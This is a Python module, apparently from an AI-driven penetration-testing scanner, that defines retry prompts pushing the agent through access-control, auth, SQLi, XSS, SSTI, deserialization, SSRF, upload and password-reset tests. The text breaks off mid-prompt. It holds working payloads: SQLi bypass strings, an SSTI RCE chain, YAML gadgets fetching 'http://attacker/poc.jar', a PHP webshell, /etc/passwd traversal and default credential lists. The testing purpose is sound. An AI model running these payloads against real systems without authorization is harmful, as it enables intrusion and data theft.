"""Hybrid Smart Retry — phase-tailored re-prompt constants.

When a high-impact OWASP / API phase produces zero findings (or misses
its core vuln class) despite having tool-call evidence, the scanner
runs ONE more pass with a tailored prompt that names specific
endpoints, payload variants, and forbids giving up too early.

These constants used to live inline inside the sequential ``run_scan``
loop in ``agent.py``. They were lifted to module scope so
``_run_phase_worker`` (the parallel-mode worker) can call into the same
retry logic.

Without this module, parallel scans silently regressed on Sonnet 4.5
(variance 56-110 vs sequential's 110+). See
``docs/scanner-internals.md`` "Hybrid Smart Retry" section.
"""
from __future__ import annotations


def phase_has_core_finding(phase_id: str, findings_for_phase: list[dict]) -> bool:
    """Module-level version of the closure that was inside ``run_scan``.

    A phase like ``web_a07`` (Authentication Failures) is only considered
    "satisfied" if at least one of its findings' title/description/
    vulnerability_type/category mentions a keyword from the core-class
    list (e.g. "default credential", "auth bypass", "jwt none"). Otherwise
    the smart retry should fire even though the phase technically returned
    findings — those findings are likely off-topic.
    """
    keywords = _PHASE_CORE_KEYWORDS.get(phase_id)
    if not keywords:
        return len(findings_for_phase) > 0
    for f in findings_for_phase:
        text = (
            (f.get("title") or "") + " "
            + (f.get("description") or "") + " "
            + (f.get("vulnerability_type") or "") + " "
            + (f.get("category") or "")
        ).lower()
        if any(kw in text for kw in keywords):
            return True
    return False


def should_run_smart_retry(
    phase_id: str,
    phase_new_findings_count: int,
    findings_for_phase: list[dict],
    phase_evidence: list,
    already_retried: bool,
) -> tuple[bool, str]:
    """Decide whether the smart retry should fire for this phase.

    Returns ``(should_retry, reason)``. ``reason`` is "zero findings",
    "no core-class finding", or "" when not retrying.
    """
    if already_retried:
        return False, ""
    if phase_id not in _ACTIVE_RETRY_PHASES:
        return False, ""
    if not phase_evidence:
        return False, ""
    if phase_new_findings_count == 0:
        return True, "zero findings"
    if phase_id in _PHASE_CORE_KEYWORDS and not phase_has_core_finding(
        phase_id, findings_for_phase
    ):
        return True, "no core-class finding"
    return False, ""


_ACTIVE_RETRY_PHASES = {
    "web_a01", "web_a07", "web_a10",
    "web_a03_sqli", "web_a03_xss", "web_a03_cmdi",
    "web_a03_ssti", "web_a03_path_traversal", "web_a03_xxe",
    "api_injection", "api_ssrf", "api_authz",
    "api_auth", "web_bfla", "api_bfla",
    "web_file_upload", "web_password_reset", "web_session_mgmt",
    "api_mass_assign", "api_data_exposure",
}
_RETRY_PROMPTS = {
    "access_control": (
        "RETRY — Phase '{name}' found 0 vulnerabilities. "
        "Review your test results below and try DIFFERENT approaches:\n\n"
        "{evidence}\n\n"
        "YOU MUST TRY:\n"
        "1. Forced browsing: /admin, /admin/users, /api/admin, /internal, /debug, "
        "/manage, /dashboard, /settings, /actuator, /api/v1/users\n"
        "2. Case-sensitivity routing bypass — for EVERY endpoint that returned 403/401 "
        "with the lowercase path (e.g. /api/users), re-send the SAME request with "
        "these case variants — Spring Security, some WAFs and reverse proxies "
        "match paths case-sensitively while the MVC router does not, causing the "
        "auth layer to be skipped:\n"
        "   /API/users, /Api/users, /aPI/users, /API/admin/users, /API/organizations\n"
        "   /API/licenses, /API/invoices, /API/billing, /API/internal\n"
        "Also try trailing-slash / path-normalization variants: /api/users/, "
        "/api/users/./, /api/users/..;/, /api/users;/, /api/users%2f, "
        "/api/users%2e, /.;/api/users, /api//users. A 200 on any of these when the "
        "canonical path returned 403 is Critical 'Access Control Bypass via Path "
        "Normalization / Case Sensitivity'.\n"
        "3. IDOR: change numeric IDs (id-1, id+1, id=0), try UUIDs, access other users' resources. "
        "If you find ONE IDOR on a resource, SWEEP the same pattern across EVERY other "
        "resource endpoint you know of: if /api/users/{{id}} is IDOR, immediately "
        "test /api/organizations/{{id}}, /api/invoices/{{id}}, /api/licenses/{{id}}, "
        "/api/subscriptions/{{id}}, /api/billing/{{id}}, /api/orders/{{id}}, "
        "/api/documents/{{id}} with the same technique. Each one that leaks another "
        "tenant's data is a separate finding.\n"
        "4. Cross-role / BFLA re-test — if the auth phase obtained MULTIPLE tokens "
        "(admin + non-admin), for EVERY admin-only endpoint that returned 200 with "
        "the admin token, re-send the same request with each non-admin token. A 200 "
        "on a low-priv token where the endpoint is documented/intended as admin-only "
        "is 'Broken Function Level Authorization — <role> can access <endpoint>' "
        "(High/Critical). Also test the reverse: unauthenticated requests to "
        "endpoints only tested with tokens — 200 without auth = 'Missing "
        "Authentication'.\n"
        "5. Method tampering: GET→POST, POST→PUT, GET→DELETE on sensitive endpoints. "
        "Also test HTTP verbs the framework may tunnel: X-HTTP-Method-Override: "
        "DELETE, _method=DELETE body param.\n"
        "6. Parameter pollution: add ?admin=true, ?role=admin, ?debug=1, "
        "?isAdmin=1, ?bypass=true, ?internal=1\n"
        "7. Try endpoints you haven't tested yet\n\n"
        "AUTHENTICATED BUSINESS-LOGIC SURFACE (frequently MISSED):\n"
        "  Generic crawls miss high-value SaaS / multi-tenant endpoints because they "
        "live behind explicit UI actions (Settings → Billing, Admin → Audit, etc.) "
        "rather than being linked from the landing page. After authentication, you "
        "MUST deliberately probe each of the following surfaces with the auth header "
        "from any session you have:\n"
        "    Tenant / org:      /api/orgs, /api/organizations, /api/tenants, "
        "/api/companies, /api/workspaces, /api/orgs/{{id}}/members, "
        "/api/orgs/{{id}}/license, /api/orgs/{{id}}/billing\n"
        "    Subscription:      /api/subscriptions, /api/plans, /api/plans/import, "
        "/api/billing, /api/invoices, /api/invoices/{{id}}, /api/invoices/template, "
        "/api/checkout, /api/payment_methods\n"
        "    Licenses:          /api/licenses, /api/licenses/generate, "
        "/api/licenses/{{id}}/revoke, /api/keys, /api/api_keys, /api/api_keys/{{id}}\n"
        "    Sessions:          /api/sessions, /api/users/{{id}}/sessions, "
        "/api/users/{{id}}/sessions/{{sid}}, /api/auth/sessions, /api/sessions/revoke\n"
        "    Audit / reports:   /api/audit, /api/audit-log, /api/audit/events, "
        "/api/reports, /api/reports/generate, /api/reports/revenue, /api/exports, "
        "/api/export/csv, /api/stats, /api/metrics\n"
        "    Admin / config:    /api/admin/users, /api/admin/orgs, /api/admin/config, "
        "/api/admin/feature_flags, /api/settings, /api/config, /api/system\n"
        "    Workflow / import: /api/workflows, /api/pipelines, /api/imports, "
        "/api/restore, /api/migrate, /api/templates, /api/forms\n"
        "    Files / storage:   /api/files, /api/files/{{id}}/download, /api/uploads, "
        "/api/attachments, /api/documents, /api/exports/{{id}}\n"
        "    Integrations:      /api/webhooks, /api/integrations, /api/oauth/clients\n"
        "  For each one that returns 200 — try every test class above (IDOR sweep, "
        "BFLA cross-role, method tampering). Each multi-tenant leak is a SEPARATE "
        "Critical 'Cross-Tenant Data Access' finding.\n\n"
        "STATE-MUTATION INVARIANTS (Session / API-Key / License revocation):\n"
        "  These are CRITICAL but rarely caught because they need a specific request "
        "sequence — execute them now if any session-management or key-management "
        "endpoint exists:\n"
        "    1. Cross-user revocation (User A creates, User B revokes):\n"
        "       a. As User A: POST /api/sessions or /api/api_keys → capture id\n"
        "       b. As User B (or unauth): DELETE /api/sessions/<A's id> "
        "or /api/api_keys/<A's id>\n"
        "       c. Re-validate as User A: 200 == User B successfully revoked → "
        "'IDOR — User can revoke other users' <session/api-key>' (High/Critical).\n"
        "    2. Self-revocation enforcement: as User A try to revoke User B's token by "
        "guessing IDs (sid-1, sid+1, UUID brute) — if 200, same finding class.\n"
        "    3. License / subscription cross-tenant generation: as Tenant A, POST "
        "/api/licenses/generate with {{\"orgId\": <Tenant B's id>}} — if 200, "
        "'Cross-Tenant License Generation' (Critical).\n"
        "    4. Role-validation absence: as a non-admin user, POST to "
        "/api/admin/users, /api/admin/orgs, /api/admin/config etc. — 200 / 403-with-"
        "data-leak / 500 not rejecting cleanly = 'Missing Role Validation' (Critical).\n"
        "    5. Org-switch / impersonation: if the app has a tenant-switch or impersonate "
        "feature, after switching, replay an old request with the previous tenant's "
        "context — unchanged tenant scope after switch = 'Impersonation Trail / "
        "Org-Switch Session Confusion' (High).\n\n"
        "DO NOT give up. Try at least 3 more approaches."
    ),
    "auth": (
        "RETRY — Phase '{name}' has NOT completed credential testing yet. "
        "Review the evidence below and perform credential discovery now:\n\n"
        "{evidence}\n\n"
        "YOU MUST TRY (use api_request to POST directly to the login endpoint(s), "
        "NOT inject_payload — many apps only validate via JSON/REST):\n"
        "1. Default credentials — try EACH of these pairs:\n"
        "   admin:admin, admin:password, admin:admin123, admin:123456,\n"
        "   administrator:administrator, root:root, test:test, guest:guest, user:user\n"
        "2. Email-format usernames — try BOTH admin AND non-admin tenant roles. "
        "Finding a non-admin credential is as valuable as finding admin, because a "
        "low-priv token is required to prove BFLA/horizontal escalation later:\n"
        "   Admin-style:   admin@<target-host>:admin123, admin@<target-host>:password,\n"
        "                  admin@juice-sh.op:admin123, administrator@<target>:password\n"
        "   Tenant/role:   owner@<target>:password, owner@acme.com:password,\n"
        "                  customer@<target>:password, manager@<target>:password,\n"
        "                  member@<target>:password, staff@<target>:password,\n"
        "                  billing@<target>:password, finance@<target>:password,\n"
        "                  support@<target>:password, user@<target>:password,\n"
        "                  licops@<target>:password, operator@<target>:password\n"
        "   Generic:       test@test.com:test123, admin@example.com:password,\n"
        "                  demo@demo.com:demo, guest@example.com:guest\n"
        "   Replace <target-host> with the actual hostname you see in the target URL "
        "(e.g. if the target is https://resurp.com, try owner@resurp.com, "
        "customer@resurp.com, etc.). App-specific prefixes you see in JS bundles or "
        "error messages are high-value guesses.\n"
        "   IMPORTANT — DO NOT stop after finding ONE working credential. Keep trying "
        "until you obtain tokens for AT LEAST 2 different roles (one admin + one "
        "non-admin if possible). Multi-role tokens enable the BFLA cross-role "
        "re-test in the access-control phase.\n"
        "3. Parameter-name permutation — if the documented field (e.g. `email`) "
        "returns a validation error (400 / 'invalid email') on SQLi payloads, RE-SEND "
        "the SAME payload using alternate identifier names on the SAME endpoint — the "
        "backend framework often silently accepts them:\n"
        "   {{\"username\":\"admin' --\",\"password\":\"x\"}}\n"
        "   {{\"user\":\"admin' --\",\"password\":\"x\"}}\n"
        "   {{\"login\":\"admin' --\",\"password\":\"x\"}}\n"
        "   {{\"identifier\":\"admin' --\",\"password\":\"x\"}}\n"
        "   {{\"user_id\":\"1 OR 1=1\",\"password\":\"x\"}}\n"
        "   {{\"account\":\"admin' --\",\"password\":\"x\"}}\n"
        "4. SQL injection auth bypass in the email/username field:\n"
        "   {{\"email\":\"admin' --\",\"password\":\"x\"}}\n"
        "   {{\"email\":\"' OR 1=1 --\",\"password\":\"x\"}}\n"
        "   {{\"username\":\"\\\" OR \\\"1\\\"=\\\"1\",\"password\":\"x\"}}\n"
        "5. Token manipulation: remove Authorization header, invalid token, JWT alg:none\n"
        "6. Brute force resistance: send 5+ rapid wrong-password attempts, check for lockout\n\n"
        "A successful login (200 + token/session returned) with a guessed password MUST\n"
        "be reported as 'Default Credentials Accepted: <user>:<pass>' (High severity).\n"
        "A successful SQLi bypass MUST be reported as 'SQL Injection Authentication\n"
        "Bypass' (Critical severity). DO NOT give up before testing at least 10 credential pairs."
    ),
    "sqli": (
        "RETRY — Phase '{name}' found 0 vulnerabilities. "
        "Review your test results below and try DIFFERENT approaches:\n\n"
        "{evidence}\n\n"
        "CRITICAL — PARAMETER-NAME PERMUTATION:\n"
        "If your SQLi payloads on the documented params returned VALIDATION-STYLE "
        "rejections (400 Bad Request, 'IllegalArgumentException', 'Invalid or used X', "
        "schema / type errors) rather than a SQL error or a successful query, the "
        "documented param is GATED by validation BEFORE reaching the DB — but the "
        "backend framework (Spring / Express / Flask) will often silently accept "
        "OTHER param names on the SAME endpoint that flow STRAIGHT to a SQL query.\n"
        "YOU MUST re-send the SAME payload to the SAME endpoint with these alternate "
        "names BEFORE concluding the endpoint is safe:\n"
        "  • identifier fields:  email, username, user, login, account, user_id, id\n"
        "  • lookup fields:      q, query, search, name, value, key, filter\n"
        "  • password-reset specifically: try email AND username AND user_id as the\n"
        "    subject field, even if the UI only sends `token` + `password`.\n"
        "A DIFFERENT response signature on an alternate name (500 with SQL error, 200 "
        "success, different body snippet) is a STRONG signal — pivot and fuzz that "
        "param with SQLi payloads.\n\n"
        "YOU MUST ALSO TRY:\n"
        "1. Use baseline_value with fuzz_parameter — without it, payloads like ' won't "
        "trigger errors in SQL LIKE clauses. Set baseline_value='test'\n"
        "2. Try DB-specific blind payloads: SLEEP(5), pg_sleep(5), WAITFOR DELAY\n"
        "3. Try UNION-based: ' UNION SELECT NULL-- with increasing NULLs\n"
        "4. Try api_request with manually crafted SQL payloads in URL params and body\n"
        "5. Test DIFFERENT endpoints you haven't tried (login, search, profile, API)\n"
        "6. Look at error messages for DB type hints (PostgreSQL, MySQL, SQLite, MSSQL)\n\n"
        "ORDER BY / GROUP BY / column-name injection (frequently missed):\n"
        "  Quoted SQL injection payloads (' OR 1=1) DO NOT WORK in ORDER BY / GROUP BY "
        "positions because those clauses don't take quoted strings — they take raw "
        "column references. If a request has any of these parameter names, treat them "
        "as a column-name injection point and use UNQUOTED payloads:\n"
        "    ?sort=    ?order=    ?orderBy=    ?order_by=    ?sortBy=\n"
        "    ?groupBy=  ?group_by=  ?dir=  ?direction=  ?column=  ?field=\n"
        "  Unquoted payload set to try (send each via api_request, watch for 5xx / "
        "SQL error / >3s response / different row count):\n"
        "    name)--                                  (terminator probe)\n"
        "    name,(SELECT 1)                          (trailing-expression — should 200)\n"
        "    name,(SELECT version())                  (UNION-style version disclosure)\n"
        "    name,SLEEP(3)                            (MySQL time-based)\n"
        "    name,pg_sleep(3)                         (PostgreSQL time-based)\n"
        "    1,(CASE WHEN 1=1 THEN SLEEP(3) ELSE 0 END)\n"
        "    name,(SELECT password FROM users LIMIT 1) (data extraction)\n"
        "  A 200 with the SLEEP variant taking >3 seconds = CONFIRMED 'SQL Injection in "
        "ORDER BY <param>' (Critical) even if the body looks normal. Time-based is the "
        "only signal here — error-based won't fire.\n\n"
        "Date / period parameter injection (audit logs, revenue reports, range filters):\n"
        "  Endpoints like /api/audit?from=...&to=...  /api/revenue?period=...  "
        "/api/reports?date=...  /api/stats?range=...  often pipe the date string into "
        "a SQL fragment such as date_trunc('day', $1::timestamp) or BETWEEN. Try:\n"
        "    period = day'); SELECT pg_sleep(3)--      (Postgres date_trunc break-out)\n"
        "    from   = 2024-01-01' OR SLEEP(3)--        (MySQL inline)\n"
        "    to     = ',(SELECT version())--           (UNION-style on second arg)\n"
        "    range  = day,(SELECT password FROM users LIMIT 1)\n"
        "  Backend usually wraps the value into a quoted SQL literal — break out of the "
        "quote before injecting. If the wrapping is unquoted (date_trunc accepts an "
        "interval literal), use the unquoted ORDER BY style above.\n\n"
        "Export / report endpoints (POST body or query param SQL injection):\n"
        "  Endpoints like POST /api/export, POST /api/reports/generate, "
        "GET /api/download?type=...  GET /api/search/csv?q=... that take an "
        "organization / tenant / project / customer NAME often build the export SQL "
        "by concatenating that name into a WHERE clause. Try the FULL NAME field "
        "(not just id), in BOTH JSON body and query string, with these payloads:\n"
        "    {{\"name\": \"' UNION SELECT NULL,version(),NULL--\"}}\n"
        "    {{\"name\": \"'; DROP TABLE x; --\"}}        (look for SQL parser error 500)\n"
        "    ?orgName=' OR 1=1--   ?tenant=' AND SLEEP(3)--\n"
        "  CSV / XLSX / PDF endpoints are commonly missed because the LLM stops once "
        "it sees the export 'works' on a benign value. ALWAYS retry with an injection "
        "payload and inspect the resulting file body for leaked rows or SQL errors.\n\n"
        "DO NOT give up. Try at least 3 more approaches AND the param-name permutation "
        "above on any endpoint that returned a validation-style rejection."
    ),
    "xss": (
        "RETRY — Phase '{name}' found 0 vulnerabilities. "
        "Review your test results below and try DIFFERENT approaches:\n\n"
        "{evidence}\n\n"
        "YOU MUST TRY:\n"
        "1. Test ALL reflection points: search boxes, URL params, form fields, headers\n"
        "2. Parameter-name permutation — if the documented param doesn't reflect, "
        "re-send the payload with these alternate names that backends commonly accept "
        "on the same endpoint: q, query, search, s, keyword, term, name, value, "
        "text, msg, message, comment, title, desc, description, returnTo, next, "
        "redirect, url, callback, debug. A NEW reflection on an alternate name = XSS.\n"
        "3. Try different encodings: URL-encode, double-encode, HTML entities\n"
        "4. Try event handlers: <img src=x onerror=alert(1)>, <svg onload=alert(1)>\n"
        "5. Try DOM-based: check if URL fragments/params are written to innerHTML\n"
        "6. Try CSP bypass if CSP is present: use existing trusted domains\n"
        "DO NOT give up. Try at least 3 more approaches."
    ),
    "injection": (
        "RETRY — Phase '{name}' found 0 vulnerabilities. "
        "Review your test results below and try DIFFERENT approaches:\n\n"
        "{evidence}\n\n"
        "YOU MUST TRY:\n"
        "1. Different separators: ;, |, &&, ||, `, $(), %0a for command injection\n"
        "2. Blind techniques: sleep/ping for CMDI, {{7*7}} for SSTI, "
        "../../etc/passwd for path traversal\n"
        "3. Parameter-name permutation — for path traversal / LFI / file-read, if the "
        "documented param returns 'invalid path' / 400, re-send the SAME payload with "
        "alternate names backends commonly accept: file, path, name, filename, doc, "
        "document, page, template, view, load, include, read, src, source, asset, "
        "resource, href. For SSTI/CMDI, try: name, template, view, cmd, command, "
        "exec, eval, q, input, data. A different response signature on an alternate "
        "name is a strong signal.\n"
        "4. Different template engines: Jinja2, Twig, Freemarker, Handlebars\n"
        "5. Different file targets: /etc/passwd, /etc/hosts, C:\\Windows\\win.ini\n"
        "6. Try inputs you haven't tested and different encoding/bypass techniques\n\n"
        "PER-ENGINE SSTI PAYLOAD SWEEP (when reflection is into rendered HTML / PDF / "
        "email / CSV / docx — anywhere a string ends up in a server-rendered template):\n"
        "  Trigger this sweep on ANY endpoint that takes a name/title/template/body/"
        "content/subject/footer field and returns rendered output. Send each engine's "
        "fingerprint payload as a SEPARATE request and watch for the literal value 49 "
        "(or 7777777) in the response — that's a CONFIRMED SSTI:\n"
        "    Jinja2 / Django:    {{7*7}}                        -> expect 49\n"
        "    Jinja2 deep:        {{7*'7'}}                      -> expect 7777777\n"
        "    Twig (PHP):         {{7*7}}                        -> expect 49\n"
        "    Twig deep:          {{7*'7'}}                      -> expect 49 (NOT 7777777)\n"
        "    Smarty (PHP):       {$smarty.version}              -> expect Smarty version\n"
        "    Mako (Python):      ${{7*7}}                       -> expect 49\n"
        "    ERB (Ruby):         <%= 7*7 %>                     -> expect 49\n"
        "    Velocity (Java):    #set($x=7*7)$x                  -> expect 49\n"
        "    FreeMarker (Java):  <#assign x=7*7>${{x}}           -> expect 49\n"
        "    FreeMarker RCE:     <#assign ex=\"freemarker.template.utility.Execute\"?new()>${{ex(\"id\")}}\n"
        "    Handlebars (JS):    {{#with \"x\"}}{{constructor.constructor(\"return 7*7\")()}}{{/with}}\n"
        "    Pug (JS):           #{{7*7}}                       -> expect 49\n"
        "    Razor (.NET):       @(7*7)                         -> expect 49\n"
        "    Thymeleaf (Java):   __${{7*7}}__::                 -> expect 49\n"
        "  Two engines distinguish themselves: Jinja2 evaluates 7*'7' to '7777777', "
        "Twig evaluates it to 49 — use that to fingerprint which engine you hit. "
        "REPORT each confirmed render as 'Server-Side Template Injection in <field> "
        "(<engine>)' (Critical) and ALWAYS attempt the per-engine RCE escalation "
        "(Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}).\n\n"
        "INSECURE DESERIALIZATION CONTENT-TYPE SWEEP:\n"
        "  Any endpoint that accepts application/x-yaml, application/yaml, "
        "application/octet-stream, application/x-java-serialized-object, "
        "application/x-php-serialized, or a base64-encoded blob in JSON "
        "({{\"data\":\"gASVDA…\"}}) is a deserialization candidate. Test each with the "
        "matching gadget. The Plan-Import / Bulk-Import / Workflow / Pipeline / Config-"
        "Restore / Template-Import endpoints (typically POST /api/*/import) are the "
        "most common surface — try them ALL even if not in the documented spec:\n"
        "    PyYAML (Python):     Send Content-Type: application/x-yaml with body:\n"
        "                           !!python/object/apply:os.system ['sleep 5']\n"
        "                           !!python/object/apply:subprocess.check_output [['id']]\n"
        "                           !!python/object/new:os.system ['id']\n"
        "                         A >5s response = CONFIRMED RCE via PyYAML.\n"
        "    SnakeYAML (Java):    Same Content-Type, body:\n"
        "                           !!javax.script.ScriptEngineManager [\n"
        "                              !!java.net.URLClassLoader [[\n"
        "                                !!java.net.URL [\"http://attacker/poc.jar\"]\n"
        "                              ]]\n"
        "                           ]\n"
        "                         OR the ScriptEngineFactory loadClass variant — "
        "                         look for ClassNotFoundException / ScriptException "
        "                         in 500 responses (still confirms unsafe parse).\n"
        "    PHP unserialize:     {{\"data\":\"O:8:\\\"stdClass\\\":1:{{s:4:\\\"data\\\";s:4:\\\"PWND\\\";}}\"}}\n"
        "                         Look for 'unserialize()' warnings in error responses.\n"
        "    Python pickle:       Send Content-Type: application/octet-stream with body\n"
        "                         being base64 of: pickle.dumps(__import__('os').system, ...)\n"
        "                         500 with 'pickle' / '_reconstructor' = unsafe parse.\n"
        "    Java native:         POST application/x-java-serialized-object with the\n"
        "                         standard ysoserial CommonsCollections1 payload (or any\n"
        "                         arbitrary 'aced0005' prefix) — 500 with\n"
        "                         'ObjectInputStream' / 'readObject' confirms.\n"
        "    .NET BinaryFormatter: x-www-form-urlencoded body with __VIEWSTATE=AAEAAAD///…\n"
        "                         (any malformed BinaryFormatter blob) — 500 with\n"
        "                         'BinaryFormatter' / 'SerializationException'.\n"
        "  REPORT confirmed exploits as 'Insecure Deserialization in <endpoint> "
        "(<library>)' (Critical) and any 500 with library-specific error text as "
        "'Unsafe Deserialization Indicator' (High — partial confirmation, the parser "
        "is unsafely processing user input even if this specific gadget didn't trigger).\n\n"
        "VERBOSE-ERROR / STACK-TRACE HARNESS:\n"
        "  Many real-world findings come not from injection success but from the SERVER'S "
        "ERROR. Once you've exhausted the payload classes above, deliberately POISON "
        "every endpoint with malformed input and capture any 5xx body for stack traces, "
        "framework banners, file paths, internal hostnames, DB schema fragments. Try:\n"
        "    1. Type confusion:        {{\"id\": []}}, {{\"id\": {{}}}}, {{\"id\": \"abc\"}}\n"
        "                              when the schema expects integer\n"
        "    2. Truncated JSON:        '{{\"name\":' (missing closing brace) — many JSON\n"
        "                              parsers leak parser internals on the failure path\n"
        "    3. Oversized strings:     {{\"name\": \"A\" * 10000}} for buffer / regex DoS\n"
        "                              and possible logging stack traces\n"
        "    4. Encoding tricks:       %00, %0a%0d, \\u0000, raw NULL bytes in path/body\n"
        "    5. Method tampering:      TRACE / OPTIONS / DEBUG / PROPFIND on every\n"
        "                              endpoint — TRACE often echoes back internal IPs\n"
        "    6. Negative / huge numbers: id=-1, id=999999999999999999, id=NaN, id=Infinity\n"
        "  REPORT each leaked detail as 'Verbose Error Disclosure — <kind>' (Low/Medium):\n"
        "    - Stack trace with file paths     -> Medium\n"
        "    - Framework / language banner     -> Low\n"
        "    - DB error with table / column    -> Medium\n"
        "    - Internal hostname / IP / CIDR   -> Medium\n"
        "    - SQL fragment in error body      -> High (also indicates SQLi candidate)\n"
        "  Each unique leakage is a SEPARATE finding (don't dedupe across endpoints).\n\n"
        "DO NOT give up. Try at least 3 more approaches."
    ),
    "ssrf": (
        "RETRY — Phase '{name}' found 0 vulnerabilities. "
        "Review your test results below and try DIFFERENT approaches:\n\n"
        "{evidence}\n\n"
        "YOU MUST TRY:\n"
        "1. Cloud metadata: http://169.254.169.254/latest/meta-data/\n"
        "2. Internal probing: http://localhost, http://127.0.0.1, http://[::1]\n"
        "3. URL params you haven't tested: ?url=, ?redirect=, ?callback=, ?next=\n"
        "4. Redirect chains: use your own URL that 302-redirects to internal targets\n"
        "5. Different URL schemes: file://, gopher://, dict://\n"
        "DO NOT give up. Try at least 3 more approaches."
    ),
    "file_upload": (
        "RETRY — Phase '{name}' has not proven RCE via file upload. "
        "Review the evidence below and actually exploit the upload:\n\n"
        "{evidence}\n\n"
        "YOU MUST TRY (use api_request or form submission — then fetch the "
        "uploaded file back with navigate/api_request and inspect the response):\n"
        "1. Executable extensions: upload .php / .asp / .aspx / .jsp / .jspx / "
        ".cgi / .pl / .py with benign content and try to hit the returned URL. "
        "If the server executes it, that's CRITICAL RCE.\n"
        "2. Double-extension & null-byte bypass: shell.php.jpg, shell.asp;.jpg, "
        "shell.php%00.jpg, shell.phtml, shell.phar — MIME-check bypass is weak.\n"
        "3. Content-Type confusion: send Content-Type: image/jpeg but payload is "
        "<?php system($_GET['c']); ?> — verify execution by fetching ?c=id.\n"
        "4. Polyglot files: valid PNG/JPEG header + trailing PHP payload; SVG "
        "with embedded <script>/<foreignObject> for stored XSS.\n"
        "5. Path traversal in filename: ../../../var/www/html/shell.php, "
        "..\\..\\webroot\\shell.aspx — can you overwrite files outside the upload dir?\n"
        "6. Oversized / zip-bomb / nested archive to probe DoS & unsafe unzip.\n"
        "REPORT: on confirmed execution, emit 'Arbitrary File Upload → RCE' "
        "(Critical). DO NOT settle for 'upload accepted' without proving execution."
    ),
    "password_reset": (
        "RETRY — Phase '{name}' has not completed password-reset abuse testing. "
        "Review the evidence below and test every class below:\n\n"
        "{evidence}\n\n"
        "YOU MUST TRY (use only the scan's own email; never hit third-party addresses):\n"
        "1. Account enumeration: diff the response (body, status, size, timing) "
        "between a known-valid email and a random one. Any visible diff = enumeration.\n"
        "2. Host-header poisoning: resend the reset request with "
        "Host: attacker.evil and X-Forwarded-Host: attacker.evil — if a reset "
        "link or body comes back referencing attacker.evil, that's account takeover.\n"
        "3. Token entropy / reuse / expiry: capture a token, request another reset "
        "and check if the old one still works (no invalidation = bad). Inspect token "
        "length, charset, predictability.\n"
        "4. Missing old-password check on the reset completion endpoint — can you "
        "POST a new password to the reset endpoint without the token, or with a "
        "guessed/expired token?\n"
        "5. Parameter-name permutation & SQLi on EVERY identifier field — the UI "
        "usually sends only {{token, password}} or {{email}}, but the backend often "
        "accepts MORE fields that flow directly into SQL. For each reset endpoint "
        "(forgot-password AND reset-password), send each of these as a SEPARATE "
        "request and watch for 5xx / SQL errors / timing differences:\n"
        "   {{\"email\":\"' OR 1=1--\"}}\n"
        "   {{\"username\":\"' OR 1=1--\"}}\n"
        "   {{\"user\":\"' OR 1=1--\"}}\n"
        "   {{\"login\":\"' OR 1=1--\"}}\n"
        "   {{\"identifier\":\"' OR 1=1--\"}}\n"
        "   {{\"user_id\":\"1 OR 1=1\"}}\n"
        "   {{\"email\":\"' AND SLEEP(5)--\"}}\n"
        "   {{\"token\":\"' OR 1=1--\"}}\n"
        "A 500 / SQL error / >3s response on ANY of these = 'SQL Injection in Password "
        "Reset <field> Parameter' (Critical). Validation-style rejections "
        "(IllegalArgumentException / 400 'invalid email') on one field do NOT imply the "
        "other fields are safe — test each independently.\n"
        "6. Parameter pollution / JSON smuggling: {{\"email\":[\"victim@x\", \"attacker@y\"]}} "
        "or CR/LF injection in the email field to split the recipient.\n"
        "7. Race condition: send 2 reset requests concurrently and see whether both "
        "tokens validate.\n"
        "REPORT host-header takeover as 'Password Reset Host Header Injection' "
        "(High), token reuse as 'Password Reset Token Not Invalidated' (High), "
        "SQLi in any identifier field as 'SQL Injection in Password Reset' (Critical)."
    ),
    "session_mgmt": (
        "RETRY — Phase '{name}' has not proven a session-management defect. "
        "Review the evidence and test each class below with get_cookies / api_request:\n\n"
        "{evidence}\n\n"
        "YOU MUST TRY:\n"
        "1. Session fixation: get the session cookie BEFORE login, log in, get it "
        "AFTER login, compare. Same value = fixation (High).\n"
        "2. Cookie flags: for every session/auth cookie, verify HttpOnly, Secure "
        "and SameSite. Missing flags on an auth cookie are each separate findings.\n"
        "3. Session in URL: check whether the token appears in any query string, "
        "fragment, or Location header — leaks via Referer & logs.\n"
        "4. Logout / privilege change invalidation: change password (or role, if "
        "possible) and verify the PREVIOUS token stops working. If it still works, "
        "that's 'Session Not Invalidated on Credential Change' (High).\n"
        "5. Concurrent-session / token reuse: a stolen token should not survive "
        "logout — test it. Long-lived JWTs with no exp claim are a finding.\n"
        "6. Entropy & predictability: assess token length and charset; extremely "
        "short or sequential tokens are brute-forceable.\n"
        "DO NOT click the logout button. Inspect via get_cookies, "
        "get_local_storage and api_request only."
    ),
    "mass_assign": (
        "RETRY — Phase '{name}' has not confirmed mass assignment. "
        "Review the evidence and do not stop at 'request accepted' — you must "
        "GET the resource back and prove the privileged field was persisted:\n\n"
        "{evidence}\n\n"
        "YOU MUST TRY (use api_request for every POST/PUT/PATCH):\n"
        "1. Privilege escalation fields: inject {{\"role\":\"admin\"}}, "
        "{{\"isAdmin\":true}}, {{\"admin\":1}}, {{\"permissions\":[\"*\"]}}, "
        "{{\"userType\":\"admin\"}}, {{\"is_staff\":true}} into user-create / "
        "user-update / register bodies, then GET the resource and confirm.\n"
        "2. Financial fields: {{\"price\":0}}, {{\"discount\":100}}, "
        "{{\"balance\":999999}}, {{\"credits\":999999}}, {{\"isPaid\":true}} "
        "on order/payment/product endpoints.\n"
        "3. State fields: {{\"verified\":true}}, {{\"active\":true}}, "
        "{{\"emailVerified\":true}}, {{\"kycStatus\":\"approved\"}}.\n"
        "4. Ownership takeover: {{\"ownerId\":<other-user>}}, "
        "{{\"userId\":<other-user>}}, {{\"email\":\"attacker@x\"}}.\n"
        "5. Schema inference: GET a resource, copy every field name from the "
        "response, and send them all back in the update body — this often "
        "surfaces read-only fields the API silently accepts.\n"
        "REPORT as 'Mass Assignment — Privilege Escalation to admin' (Critical) "
        "or 'Mass Assignment — Price Tampering' (High) with before/after JSON proof."
    ),
    "data_exposure": (
        "RETRY — Phase '{name}' has not enumerated excessive data exposure. "
        "Review the evidence and go deeper — don't stop at 'response looks normal':\n\n"
        "{evidence}\n\n"
        "YOU MUST TRY:\n"
        "1. UI-vs-API diff: for profile/orders/settings, compare what the UI renders "
        "to what the API returns. Every extra field (password_hash, salt, "
        "internal_id, ssn, phone, 2fa_secret, apiKey, stripe_customer_id) is a finding.\n"
        "2. List/search endpoints: /api/users, /api/users?limit=1000, "
        "/api/search?q=*, /api/admin/users — do unauthenticated or low-priv roles "
